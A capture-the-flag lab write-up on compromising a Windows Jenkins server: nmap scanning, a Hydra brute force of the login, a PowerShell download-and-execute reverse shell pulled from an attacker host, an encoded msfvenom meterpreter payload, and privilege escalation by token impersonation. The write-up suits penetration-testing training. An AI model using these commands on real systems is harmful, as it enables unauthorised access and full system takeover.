In this room, we'll learn how to exploit a common misconfiguration on a widely used automation server(Jenkins - This tool is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made change to it). After which, we'll use an interesting privilege escalation method to get full system access.
Since this is a Windows application, we'll be using Nishang to gain initial access. The repository contains a useful set of scripts for initial access, enumeration and privilege escalation. In this case, we'll be using the reverse shell scripts
NMAP:

Starting Nmap 7.60 ( https://nmap.org ) at 2021-03-07 20:38 GMT
Nmap scan report for ip-10-10-140-114.eu-west-1.compute.internal (10.10.140.114)
Host is up (0.00044s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Site doesn't have a title (text/html).
3389/tcp open  tcpwrapped
8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
MAC Address: 02:B4:ED:8F:02:5B (Unknown)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.58 seconds

Found a vulnerable jenkins webserer.

using gobuster:
>gobuster dir -u http://10.10.140.114:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s 200

use hydra to bruteforce:
In order to brute force the login form using Hydra, the URL, Form parameter, and the Login error message should be accurate

>sudo hydra -s 8080 10.10.85.139 https-post-form "/j_acegi_security_check: j_username=^USER^&j_password=^PASS^:Invalid Username/password" -l admin
-P /usr/share/wordlists/rockyou.txt

Get a reverse Shell:
use this command to get the reverse shell on your machine and then run it: 
also host a python server and also listen on the given port.
We will use Nishang: https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

>powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port

To make the privilege escalation easier, let's switch to a meterpreter shell using the following process.

Use msfvenom to create the a windows meterpreter reverse shell using the following payload
>msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.10.247.90 LPORT=4443 -f exe -o exploit.exe

After creating this payload, download it to the machine:
but first start a python server to host the exploit.exe file.
>powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.247.90:8080/exploit.exe','exploit.exe')"

Use below to get the reverse shell:
>use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-ip set LPORT listening-port run

After running the listener, start the process using below:
>Start-Process "exploit.exe"

You will get the meterpreter shell by now.

View all the privileges using: 
>whoami /priv

Find the enabled privileges:
SeDebugPrivilege, SeImpersonatePrivilege are enabled.

Let's use the incognito module that will allow us to exploit this vulnerability. Enter: load incognito to load the incognito module in metasploit. Please note, you may need to use the use incognito command if the previous command doesn't work. Also ensure that your metasploit is up to date.

To check which tokens are available, enter the: 
>list_tokens -g

Use the BUILTIN\Administrators token:
>impersonate_token "BUILTIN\Administrators" 
>run getuid

Even though you have a higher privileged token you may not actually have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do). Ensure that you migrate to a process with correct permissions (above questions answer). The safest process to pick is the services.exe process.

> ps | grep services.exe
> migrate PID-of-process
> getuid

Now you are actually a root user









